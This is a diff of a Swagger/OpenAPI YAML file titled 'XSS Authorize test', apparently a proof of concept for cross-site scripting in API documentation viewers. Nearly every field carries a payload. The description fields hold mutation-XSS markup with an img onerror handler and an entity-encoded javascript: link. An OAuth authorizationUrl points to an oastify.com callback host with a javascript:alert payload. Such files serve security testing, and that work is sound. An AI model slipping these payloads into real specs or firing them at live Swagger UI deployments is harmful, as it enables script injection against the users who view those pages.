@@ -1,12 +1,21 @@
 swagger: "2.0"
-securityDefinitions:
-  a:
-    type: oauth2
-    authorizationUrl: hdy9f6co4267ouopbsao3br2ltrkfa3z.oastify.com/javascript:alert(document.domain)//
+components:
+  securitySchemes:
+    oAuthSample:    # <---- arbitrary name
+      type: oauth2
+      description: |
+        <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+      flows:
+        implicit:   # <---- OAuth flow(authorizationCode, implicit, password or clientCredentials)
+          authorizationUrl: http://hdy9f6co4267ouopbsao3br2ltrkfa3z.oastify.com/javascript:alert(document.domain)
+          scopes:
+            read_pets: read your pets
+            write_pets: modify pets in your account
 info:
   version: "2.0"
   title: XSS Authorize test
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script> alert(document.domain)</script>"></form>
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<a href=j&#97v&#97script:&#97lert('xss')>ClickMe</a>"></form>
 paths:
   /:
     get:
